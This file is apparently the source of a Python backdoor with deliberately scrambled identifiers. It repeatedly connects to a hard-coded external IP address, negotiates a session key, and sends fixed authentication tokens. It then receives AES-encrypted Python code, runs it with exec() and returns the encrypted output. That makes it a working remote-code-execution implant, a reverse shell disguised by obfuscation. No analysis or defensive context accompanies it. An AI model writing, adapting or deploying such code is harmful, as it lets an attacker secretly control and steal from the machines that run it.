import io
import os
import sys
import time
import socket
import base64
import random
import signal
import hashlib
import subprocess
from threading import Thread
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding as sym_padding
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import rsa



ISlLOogcdQgJttkCWjXyLbqXkx = []
leWvcmbqVoYoLffRzABQfxjwhVdXjsBdo = []

def nqzRdrJBddVWYHjDZQWsCaoBiJZegYMYlOCKgjnunlgbWnC(sig, frame):

    for fpQCVpsUFlIavhhWBtMrtCfkQKYfCJvgugvLwPhR in ISlLOogcdQgJttkCWjXyLbqXkx:
        fpQCVpsUFlIavhhWBtMrtCfkQKYfCJvgugvLwPhR.close()

    sys.exit(0)

signal.signal(signal.SIGINT, nqzRdrJBddVWYHjDZQWsCaoBiJZegYMYlOCKgjnunlgbWnC)

YrcahnMcEQSOzNZoBFBEYxfbmBW = """-----BEGIN RSA PUBLIC KEY-----
MIICCgKCAgEAmPJ5v+Wh5OQSMe2WvXwkLVME19/I5n6JRCCwMhXpN9LYUJl/Z0yr
Od8XRCq4/LvuIkEV8uJGC1QwH1cEqGNhrPIOKzR6j/1PlCpwCwxi1lFdrEf0Jy2F
9Q8VW7z/wQEC9uUKwnsZG7R5ZP4uKQh4ElbW00aYk2FMmPh0T50+buxyKFG2G220
fYfjacHPkBuss3RZnyc2KsZC2GsS8siSE7tQFmLZwtRgV4IYTSwzupGDxhzc1shA
TVOat0fdp/m5OuGrJuBGsu0R0jNUiTwILPYm925a84qQyGn01UBpHy8kKnG5SyVG
F+6L91zsCosp85BpCNsUdaAV9qe5m/W4KTQgXttyp+KwrX+tuyvbtq8JPNvCbiB3
ibA4ZiSVrL0/laNyJj7UPJPQXXWXErMgPTRd4eb0RJCAbs1uem113jXh14a9JrJW
qo6XvXQuvpDWK2qIh0nbxO7hAWpGg+ujSFjl15ZeGkmlMKaJKaD0j3sEQPYiUdzo
LfjPJdFA0v9Da3LCXX+lkoy+NfdL2HfVjC8heMZw+d56sV84Kxqnu8jBM5wHoTvw
ObLJHw7wp0Aa/7Q7Mb0rbNT5g6+sXMSBrEUp6rSF+ONYYGlrVs2WZG8jqxjqN+Wx
l7zPR7yGdgZbdHk8ctXLOqOqdRObDc8upwOzuCYvrkb1T+iDZtxV3sECAwEAAQ==
-----END RSA PUBLIC KEY-----
"""

tVnDJpRrUMgzYgroHtBtELUcZHHtixkY = YrcahnMcEQSOzNZoBFBEYxfbmBW.encode('utf-8')

tCwIMchhGJtXMTNH = serialization.load_pem_public_key(tVnDJpRrUMgzYgroHtBtELUcZHHtixkY)

def dBhkAxyPfRAhjyFyANMGLmsNpgOyEGeNwLaBHaU(tCwIMchhGJtXMTNH, bsDJyPBejsfnznHSXMzDcbBInEkSrRDJjQWCwILcCF):

    tVPDFnSVZucmKxBMiytZZFjO= tCwIMchhGJtXMTNH.key_size

    NcvWCRMqucBcMbxXvtnfFk = (tVPDFnSVZucmKxBMiytZZFjO// 8 ) - 2 * hashes.SHA256().digest_size - 2

    if len(bsDJyPBejsfnznHSXMzDcbBInEkSrRDJjQWCwILcCF) > NcvWCRMqucBcMbxXvtnfFk:
        sys.exit(0)

    try:
        fBSBThQbrOCCvqTMTxrBlzxKhVSoBNmGfTWZ = tCwIMchhGJtXMTNH.encrypt(
            bsDJyPBejsfnznHSXMzDcbBInEkSrRDJjQWCwILcCF,
            padding.OAEP(
                mgf=padding.MGF1(algorithm=hashes.SHA256()),
                algorithm=hashes.SHA256(),
                label=None
            )
        )
    except Exception as e:
        sys.exit(1)

    fsTfXKqWIRSUYkJiyaFh = base64.b64encode(fBSBThQbrOCCvqTMTxrBlzxKhVSoBNmGfTWZ).decode('utf-8')
    return fsTfXKqWIRSUYkJiyaFh


def DzsCMgJVNvuupyeGToclxGdf(dlaGuBRsgEIPmSnmWwD):
    qlfhXqORlfSzieOXnWVtMnuMqCWOMMSoKeQJrImOEqWgF = dlaGuBRsgEIPmSnmWwD.recv(4096)
    qlfhXqORlfSzieOXnWVtMnuMqCWOMMSoKeQJrImOEqWgF = qlfhXqORlfSzieOXnWVtMnuMqCWOMMSoKeQJrImOEqWgF.decode()

    n, g = qlfhXqORlfSzieOXnWVtMnuMqCWOMMSoKeQJrImOEqWgF.split(',')
    n = int(n)
    g = int(g)

    x = random.randint(1, n - 1)
    DoPXavbUPCdDYmwyEETGCbCTmZBbDbQLztcDmND = int(pow(g, x, n))

    DoPXavbUPCdDYmwyEETGCbCTmZBbDbQLztcDmND = str(DoPXavbUPCdDYmwyEETGCbCTmZBbDbQLztcDmND)
    dlaGuBRsgEIPmSnmWwD.send(DoPXavbUPCdDYmwyEETGCbCTmZBbDbQLztcDmND.encode())

    oxboEvlDrXYqecvgslkbALgkb = dlaGuBRsgEIPmSnmWwD.recv(4096)
    oxboEvlDrXYqecvgslkbALgkb = int(oxboEvlDrXYqecvgslkbALgkb.decode())

    rhkKBNDkLLcDMteYcBtIf = pow(oxboEvlDrXYqecvgslkbALgkb, x, n)

    iuXEERGzWOzwVNUZTplPmNzJkdEqlAJlaALHKGpPYqn = int.to_bytes(rhkKBNDkLLcDMteYcBtIf, length=(rhkKBNDkLLcDMteYcBtIf.bit_length() + 7) // 8, byteorder='big')
    iuXEERGzWOzwVNUZTplPmNzJkdEqlAJlaALHKGpPYqn = hashlib.sha256(iuXEERGzWOzwVNUZTplPmNzJkdEqlAJlaALHKGpPYqn).digest()

    return iuXEERGzWOzwVNUZTplPmNzJkdEqlAJlaALHKGpPYqn


def dLQHNiEfOgflOFozwqzF(qZHJpJAoLkJMTDGVXxpTrUr, ImpLkfBbtlGzglJvfsmDCEgriE, fUMVoLcAMfdOERrTMFPYNYVYWrMULDCDMhmdNLNCgRAl, gznJUfNIHyKDEquVpOSYGXyBXTPClrWgyJpGrYiGb):

    if (qZHJpJAoLkJMTDGVXxpTrUr, ImpLkfBbtlGzglJvfsmDCEgriE) in leWvcmbqVoYoLffRzABQfxjwhVdXjsBdo:
        return

    dlaGuBRsgEIPmSnmWwD = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    dlaGuBRsgEIPmSnmWwD.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    ISlLOogcdQgJttkCWjXyLbqXkx.append(dlaGuBRsgEIPmSnmWwD)

    try:
        dlaGuBRsgEIPmSnmWwD.connect((qZHJpJAoLkJMTDGVXxpTrUr, ImpLkfBbtlGzglJvfsmDCEgriE))
        leWvcmbqVoYoLffRzABQfxjwhVdXjsBdo.append((qZHJpJAoLkJMTDGVXxpTrUr, ImpLkfBbtlGzglJvfsmDCEgriE))
        
        iuXEERGzWOzwVNUZTplPmNzJkdEqlAJlaALHKGpPYqn = DzsCMgJVNvuupyeGToclxGdf(dlaGuBRsgEIPmSnmWwD)

        EcmjHTSEmQwioDJkweFlIWeMDGkvxICbQjjzZhjnhac = "abd660358dd97c26a1136f5e7bf3b7243ae82e4f9b93370e53e7857fae61b43a"
        try:
            sCaXGuFBAqzgtNcteveLGSWnrXaNVAleQtGGXcUqKJcvV = yvLYYdHITWcvmhCqSClpUwBUZBVosipvI(iuXEERGzWOzwVNUZTplPmNzJkdEqlAJlaALHKGpPYqn, EcmjHTSEmQwioDJkweFlIWeMDGkvxICbQjjzZhjnhac.encode())
            dlaGuBRsgEIPmSnmWwD.send(sCaXGuFBAqzgtNcteveLGSWnrXaNVAleQtGGXcUqKJcvV)
        except Exception as e:
            pass

        PUQqjYejmVUPBVoybAbUDQJGxLmTGcmDwsJOqvEBYrXv = "b7afd39a9616dbecb8e9834f817c929096223bf9930b6339ee1bf4a0a65eb9f4"

        try:
            PUQqjYejmVUPBVoybAbUDQJGxLmTGcmDwsJOqvEBYrXv = yvLYYdHITWcvmhCqSClpUwBUZBVosipvI(iuXEERGzWOzwVNUZTplPmNzJkdEqlAJlaALHKGpPYqn, PUQqjYejmVUPBVoybAbUDQJGxLmTGcmDwsJOqvEBYrXv.encode())
        except Exception as e:
            pass


        while True:

            dlaGuBRsgEIPmSnmWwD.send(PUQqjYejmVUPBVoybAbUDQJGxLmTGcmDwsJOqvEBYrXv)

            VfZGskfdgyXZqCMf = dlaGuBRsgEIPmSnmWwD.recv(4096)
            try:
                jAEBxhcUMHYOelZBuaolwCjuOgDb = jowdRXbVXKHASEoEXYqehDBWmh(iuXEERGzWOzwVNUZTplPmNzJkdEqlAJlaALHKGpPYqn, VfZGskfdgyXZqCMf)
            except Exception as e:
                continue

            vPBEMeYfFesDsKpVvJfkxHyxhpvl = sys.stdout
            qcwrBpcgCBRkOGvTZNQjQCWvXLWYChUxGWNBotunYphKW = io.StringIO()
            sys.stdout = qcwrBpcgCBRkOGvTZNQjQCWvXLWYChUxGWNBotunYphKW

            try:
                exec(jAEBxhcUMHYOelZBuaolwCjuOgDb)
                GzDIrAemIqCMfLfbT = qcwrBpcgCBRkOGvTZNQjQCWvXLWYChUxGWNBotunYphKW.getvalue()
                if GzDIrAemIqCMfLfbT:
                    print(GzDIrAemIqCMfLfbT)
                elif GzDIrAemIqCMfLfbT == "":
                    GzDIrAemIqCMfLfbT = "empty qlfhXqORlfSzieOXnWVtMnuMqCWOMMSoKeQJrImOEqWgF"
            except Exception as e:
                GzDIrAemIqCMfLfbT = e
            finally:
                sys.stdout = vPBEMeYfFesDsKpVvJfkxHyxhpvl

            print(GzDIrAemIqCMfLfbT)

            zNcybwMhoLbYgHMWRfouHuxaRmWYr = yvLYYdHITWcvmhCqSClpUwBUZBVosipvI(iuXEERGzWOzwVNUZTplPmNzJkdEqlAJlaALHKGpPYqn, GzDIrAemIqCMfLfbT.encode())
            dlaGuBRsgEIPmSnmWwD.send(zNcybwMhoLbYgHMWRfouHuxaRmWYr)

            time.sleep(1)


    except Exception as e:
        pass

    finally:
        if (qZHJpJAoLkJMTDGVXxpTrUr, ImpLkfBbtlGzglJvfsmDCEgriE) in leWvcmbqVoYoLffRzABQfxjwhVdXjsBdo:
            leWvcmbqVoYoLffRzABQfxjwhVdXjsBdo.remove((qZHJpJAoLkJMTDGVXxpTrUr, ImpLkfBbtlGzglJvfsmDCEgriE))

        dlaGuBRsgEIPmSnmWwD.close()

def yvLYYdHITWcvmhCqSClpUwBUZBVosipvI(key, HaPHKGStxoMWiFOfDlRHKuhuCAgVmkM):
    wOqCKQSnhRShkVLGZhDAmUKSRMZiKNM = os.urandom(16)
    PcYTdBZLzXXOVJwOvrlEyTPBRIFfSZl = Cipher(algorithms.AES(key), modes.CBC(wOqCKQSnhRShkVLGZhDAmUKSRMZiKNM), backend=default_backend())
    wRgHPGWOcufKGRroMomMjcxLflZTsnojYyUCd = PcYTdBZLzXXOVJwOvrlEyTPBRIFfSZl.encryptor()

    xgSpsTzVitwAiAZWkdrPUoztGaDjNETdFEBGVz = sym_padding.PKCS7(algorithms.AES.block_size).padder()
    uOoQQjXdiWuCTFAaVdlbIRjMatReARzeFZDoEpuPGehxfD = xgSpsTzVitwAiAZWkdrPUoztGaDjNETdFEBGVz.update(HaPHKGStxoMWiFOfDlRHKuhuCAgVmkM) + xgSpsTzVitwAiAZWkdrPUoztGaDjNETdFEBGVz.finalize()

    PcYTdBZLzXXOVJwOvrlEyTPBRIFfSZltext = wRgHPGWOcufKGRroMomMjcxLflZTsnojYyUCd.update(uOoQQjXdiWuCTFAaVdlbIRjMatReARzeFZDoEpuPGehxfD) + wRgHPGWOcufKGRroMomMjcxLflZTsnojYyUCd.finalize()
    return wOqCKQSnhRShkVLGZhDAmUKSRMZiKNM + PcYTdBZLzXXOVJwOvrlEyTPBRIFfSZltext

def jowdRXbVXKHASEoEXYqehDBWmh(key, CsnjkXawOhtJcGhJfKCLSExNyirv):
    wOqCKQSnhRShkVLGZhDAmUKSRMZiKNM = CsnjkXawOhtJcGhJfKCLSExNyirv[:16]
    PcYTdBZLzXXOVJwOvrlEyTPBRIFfSZltext = CsnjkXawOhtJcGhJfKCLSExNyirv[16:]

    PcYTdBZLzXXOVJwOvrlEyTPBRIFfSZl = Cipher(algorithms.AES(key), modes.CBC(wOqCKQSnhRShkVLGZhDAmUKSRMZiKNM), backend=default_backend())
    MRNicaMwuYMOSNStlZPbePGmB = PcYTdBZLzXXOVJwOvrlEyTPBRIFfSZl.decryptor()

    cXmwPRdXNgJRKoFPKAfGJLYdWBxkfneBTOugFQLXVlPcbc = MRNicaMwuYMOSNStlZPbePGmB.update(PcYTdBZLzXXOVJwOvrlEyTPBRIFfSZltext) + MRNicaMwuYMOSNStlZPbePGmB.finalize()

    rorzMWgOGEiyehbSbaIfLYTNpKxCiCVoDrw = sym_padding.PKCS7(algorithms.AES.block_size).unpadder()
    HaPHKGStxoMWiFOfDlRHKuhuCAgVmkM = rorzMWgOGEiyehbSbaIfLYTNpKxCiCVoDrw.update(cXmwPRdXNgJRKoFPKAfGJLYdWBxkfneBTOugFQLXVlPcbc) + rorzMWgOGEiyehbSbaIfLYTNpKxCiCVoDrw.finalize()

    return HaPHKGStxoMWiFOfDlRHKuhuCAgVmkM.decode('utf-8')


if __name__ == "__main__":

    qZHJpJAoLkJMTDGVXxpTrUr = "34.204.78.186"
    ImpLkfBbtlGzglJvfsmDCEgriE = int(65500)
    fUMVoLcAMfdOERrTMFPYNYVYWrMULDCDMhmdNLNCgRAl = "127.0.0.1"
    gznJUfNIHyKDEquVpOSYGXyBXTPClrWgyJpGrYiGb = 1239

    while True:
        try:
            dLQHNiEfOgflOFozwqzF(qZHJpJAoLkJMTDGVXxpTrUr, ImpLkfBbtlGzglJvfsmDCEgriE, fUMVoLcAMfdOERrTMFPYNYVYWrMULDCDMhmdNLNCgRAl, gznJUfNIHyKDEquVpOSYGXyBXTPClrWgyJpGrYiGb)
        except Exception as e:
            time.sleep(1)
            continue

        time.sleep(5)
